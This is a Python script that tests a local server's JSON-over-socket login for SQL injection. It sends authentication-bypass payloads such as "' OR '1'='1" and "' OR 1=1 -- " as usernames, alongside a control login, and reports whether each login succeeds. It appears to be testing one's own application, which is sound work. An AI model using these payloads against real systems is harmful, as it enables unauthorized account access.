#!/usr/bin/env python3
# Clean SQL injection test: one fresh connection per case.
import socket, struct, json, time

HOST, PORT = '127.0.0.1', 8888
PAYLOAD = "' OR '1'='1"


def pack(o):
    p = json.dumps(o, ensure_ascii=False).encode('utf-8')
    return struct.pack('>I', len(p)) + p


def recv_msg(s):
    h = b''
    while len(h) < 4:
        c = s.recv(4 - len(h))
        if not c:
            return None
        h += c
    n = struct.unpack('>I', h)[0]
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            return None
        b += c
    return b.decode('utf-8', errors='replace')


def show(tag, raw):
    if raw is None:
        print('  %s: (connection closed)' % tag)
        return None
    # print the decoded text, not the \uXXXX escapes
    txt = raw.replace('\n', ' ')
    print('  raw   : %s' % txt)
    try:
        obj = json.loads(raw)
        print('  parsed: %s' % json.dumps(obj, ensure_ascii=False))
        return obj
    except Exception as e:
        print('  parse failed: %s' % e)
        return None


def drain(s, t=0.8):
    """Read every message the server sends back (login reply + online_users broadcast)."""
    s.settimeout(t)
    out = []
    while True:
        try:
            r = recv_msg(s)
            if r is None:
                break
            out.append(r)
        except socket.timeout:
            break
    s.settimeout(None)
    return out


def case(name, username, password):
    print('=' * 60)
    print('CASE: %s' % name)
    print('  username = %r' % username)
    print('  password = %r' % password)
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(pack({"type": "login", "username": username, "password": password}))
    replies = drain(s)
    login_reply = None
    for r in replies:
        obj = show('reply', r)
        if obj and obj.get('type') == 'login':
            login_reply = obj
    # always clean up so the next case starts fresh
    s.sendall(pack({"type": "logout", "username": username}))
    drain(s)
    s.close()
    time.sleep(0.3)
    verdict = 'SUCCESS' if (login_reply and login_reply.get('success')) else 'FAIL'
    print('  --> %s' % verdict)
    print('')
    return verdict


print('payload bytes: %s' % ' '.join('%02X' % b for b in PAYLOAD.encode()))
print('')

case('1. injection + WRONG password',
     PAYLOAD, 'definitely_wrong_pw')
case('2. injection + REAL password 123456',
     PAYLOAD, '123456')
case('3. injection via comment (no password needed)',
     "' OR 1=1 -- ", 'anything')
case('4. control: normal user, correct password',
     'zhule', '123456')